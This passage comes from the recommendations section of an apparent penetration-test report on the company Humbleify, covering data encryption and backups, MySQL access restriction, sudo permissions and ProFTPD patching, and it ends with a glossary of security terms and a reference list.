Additionally, the company should also consider maintaining the data backup in order to prevent of data loss, theft and potential technical issues.

-   Adopting an encrypted messaging platform which could encrypt all conversations and file exchange internally.

-   Internal and external data must be stored in an encrypted server or password-protected folders to prevent unauthorised attempts.

-   Data should be set up management permissions in various level to ensure that employees only have sufficient access and permission to work with the file without manipulating the information.

-   Humbleify should maintain automated data backup regularly, especially for sensitive data to avoid any data loss, thef and potential technical issues. This backup should be supervised and recorded into the acitivity log to detect any suspicious attempts trying to delete or manipulate the data and ensure better data management.

## 5.4. MySQL accessibility

### 5.4.1. **Access restrictions**

According to Sub-Section 4.5, all employees had access to the MySQL database, which contained confidential information about consumers and employees. In addition, by granting everyone access to the MySQL database, it is easier for an attacker to obtain sensitive information by getting a permit from a random staff member with no authority to perform their tasks in the MySQL database. It is therefore strongly advised that Humbleify restrict access to the MySQL database.

-   Examine each employee's role and responsibilities, then alter their access permissions to ensure they have only the level of access required to perform their mySQL database-related duties. Employees with no database-related responsibilities should have their database access revoked to prevent unauthorised access and the possibility of an attacker acquiring access through other employees.

-   Employees with MySQL database access should have their own account in order to monitor the activity of each employee in the database and prevent account sharing. Each account must have a strong, unique password that is difficult to predict.

-   The 2FA method should be implemented to provide an additional layer of identity authentication and prevent attackers from gaining database access by merely obtaining the password.

### 5.4.2. Cybersecurity training

It is important to conduct regular training for the employees about cybersecurity and how to work with the MySQL database in order to equip them with proper knowledge on MySQL and report suspicious activities trying to manipulate the database.

-   Conduct regular training for employees.

-   The training program should be designed based on the level of accessibility. The highest level of accessibility into the database should have the in-depth training and regular updates about any changes related to MySQL.

-   All employees should understand the importance of cybersecurity, how to identify suspicious attempts and the procedures on reporting unauthorised access or any abnormal activities.

### 5.4.3. MySQL **version updates and penetration tests**

Moreover, the team would like to recommend the company to maintain automatic updates to ensure that the current MySQL is the latest version in order to prevent using out-of-date versions, which could create potential opportunities for attackers gaining access to the database.

-   Updating MySQL to the newest version. Humbleify should maintain regular updates or set up automatic updates to ensure the company is using the newest version.

-   Maintain regular assessments to double-check on any potential vulnerabilities such as penetration tests or security audits.

## 5.5. Sudo exploitation

### 5.5.1. Su**do Permission**

According to Sub-Sections 3.3 and 5.3, the team discovered how to exploit sudo to gain elevated privileges in the system and access sensitive information through Tyler's unencrypted notes. As stated in Section 5.3, it is strongly recommended that all passwords and confidential data be stored in a secure location and that data be encrypted. In addition, as Tyler Henry granted sudo permission to Marlah Hayes, an unauthorised employee, even though Marlah has no responsibilities related to this, the team advised Humbleify to closely evaluate the roles and responsibilities of each employee to ensure the correct assignment of sudo.

-   Review the role and responsibilities of each employee and modify the permission to sudo.

-   Strictly limiting access to sudo to specific employees with work-related responsibilities.

-   Configuring the sudo activity log to monitor and detect suspicious activities or unauthorised access.

-   Conduct routine evaluations and audits to ensure that only active employees are granted sudo privileges.

### 5.5.2. Sudo version updates

In order to avoid cyber attacks resulting from bugs in the sudo version, it is advised that the company should regularly update the system's critical version and patches.

-   Maintain regular updates for the sudo package to ensure that it includes all security patches for older versions.

## 5.6. ProFTPD

As the team was able to sucessfully exploited the ProFTPD, the team would like to advised Humbleify to maintain regular updates to ensure that all security patches will exist for older versions so that the attackers could not manipulate old versions to get access into the system.

-   ProFTPD should be routinely updated to the most recent system in order to ensure that there are no security holes exploitable by cybercriminals.

-   The operating system must be updated to ensure that all security updates for older versions are installed.

-   Review the activity log on a regular basis in order to manage access, rapidly detect abnormal activities, and mitigate risks.

-   Carefully examine the permissions and only grant sufficient access to those whose duties involve the server.

# VI. Glossary

**Nmap:** It is an open-source, powerful network scanner for discovering and assessing hosts, services, and vulnerabilities on computer networks (Asaad, 2021).

**MySQL:** It is an open-source relational database management system (RDBMS) for providing multi-user access to multiple databases (Nani Fadzlina Naim et al., 2011).

**Hashing:** It is a one-way function that takes an output string, often called a "hash", and makes it a random-looking string of characters (Hranický et al., 2019).

**Hashcat:** Hashcat is an open source password recovery tool for cracking password hashes. It offers multiple attack modes for obtaining effective (Hranický et al., 2019).

**Metasploit:** It is a widely used open source penetration testing and vulnerability exploitation framework for assessing and verifying the security of computer systems, networks and applications (Hranický, R., Zobal, L., Ryšavý, O., & Kolář, 2019).

**Msfconsole:** Metasploit is a computer security tool that works like a penetration tester. And it is the most common interface to the framework (msf) (Bradbury, 2010).

**Root:** "root" is the system's superuser with the highest privileges and permissions. Thus vulnerable applications with root user privileges may compromise the entire system (Shukla et al., 2013).

**Exploitation:** It involves using tools including the hundreds found within Kali Linux and code to take advantage of discovered vulnerabilities across different software, systems, or applications (Esler,2009).

**Web shell:** It is a type of malware or script used to establish remote access and control channels on an infected server or web application. provides hackers with the ability to remotely execute commands, tamper with confidential data, and hack into web Server web interface (Hannousse & Yahiouche, 2021).

**Salt:** It is a randomly generated block of data used to enhance the security of a password hash. and puts it into a hash function by appending Salt to the beginning or end of the password (Jeong, J., Woo, D., & Cha, Y,2019).

**Vulnerabilities:** A vulnerability is a point of weakness or weakness through which an intruder or attacker can gain unauthorized access to an Internet user's account (Egwuche, O. S., Ganiyu, M., & Akeem, 2022, April 1).

**Backdoor:** It is a type of malware that allows unauthorized access, control or manipulation of a system (Hranický, R., Zobal, L., Ryšavý, O., & Kolář, 2019).

# References

Asaad, R. R. (2021). Penetration Testing: Wireless Network Attacks Method on Kali Linux OS. *Academic Journal of Nawroz University*, *10*(1), 7. https://doi.org/10.25007/ajnu.v10n1a998

Bradbury, D. (2010). Hands-on with Metasploit Express. *Network Security*, *2010*(7), 7–11. https://doi.org/10.1016/s1353-4858(10)70092-1

Cooke, E., & Jahanian, F. (2005). *USENIX SRUTI ’05 Technical Paper*. Www.usenix.org. https://www.usenix.org/legacy/event/sruti05/tech/full_papers/cooke/cooke_html/

Egwuche, O. S., Ganiyu, M., & Akeem, A. A. (2022, April 1). *Assessing the Vulnerabilities of Internet Users to Cyber-Attacks using their Password Login Patterns*. IEEE Xplore. https://doi.org/10.1109/NIGERCON54645.2022.9803155

Esler , J. (2009). *Cyber Security Awareness Month - Day 7 - Port 6667/8/9/7000 - IRC: is it evil?* SANS Internet Storm Center. https://isc.sans.edu/diary/Cyber+Security+Awareness+Month+-+Day+7+-+Port+6667897000+-+IRC+is+it+evil/7285

Francois, J., State, R., & Festor, O. (2008). Activity Monitoring for large honeynets and network telescopes. *International Journal on Advances in Systems and Measurements*, *1*(1), 1–13. http://www.iariajournals.org/systems_and_measurements/

Hannousse, A., & Yahiouche, S. (2021). Handling webshell attacks: A systematic mapping and survey. *Computers & Security*, *108*, 102366. https://doi.org/10.1016/j.cose.2021.102366

Hranický, R., Zobal, L., Ryšavý, O., & Kolář, D. (2019). Distributed password cracking with BOINC and hashcat. *Digital Investigation*, *30*, 161–172. https://doi.org/10.1016/j.diin.2019.08.001

Jeong, J., Woo, D., & Cha, Y. (2019). *Enhancement of Website Password Security by Using Access Log-based Salt*. IEEE Xplore. https://doi.org/10.1109/SysCoBIoTS48768.2019.9028012

Nani Fadzlina Naim, Ihsan, A., Fathul, W., & Suzi Seroja Sarnin. (2011). *MySQL Database for Storage of Fingerprint Data*. https://doi.org/10.1109/uksim.2011.62

*Rapid7. (n.d.). ProFTPD 1.3.5 mod_copy command execution. Rapid7 Exploit Database. https://www.rapid7.com/db/modules/exploit/unix/ftp/proftpd_modcopy_exec/*

Rapid7. (n.d.). RPCBomb Auxiliary Module. Rapid7 Exploit Database. https://www.rapid7.com/db/modules/auxiliary/dos/rpc/rpcbomb/

Rapid7. (n.d.). Unreal IRCd 3.2.8.1 Backdoor Command Execution. Rapid7 Exploit Database. https://www.rapid7.com/db/modules/exploit/unix/irc/unreal_ircd_3281_backdoor/

Seta, H., Wati, T., & Kusuma, I. C. (2019, October 1). *Implement Time Based One Time Password and Secure Hash Algorithm 1 for Security of Website Login Authentication*. IEEE Xplore. https://doi.org/10.1109/ICIMCIS48181.2019.8985196

Shukla, H. K., Singh, V. K., Choi, Y.-H., Kwon, J., & Hahm, C.-H. (2013). *Enhance OS security by restricting privileges of vulnerable application*. https://doi.org/10.1109/gcce.2013.6664800

Tenable. (2018). *UnrealIRCd Backdoor Detection*. Tenable.com. https://www.tenable.com/plugins/nessus/46882
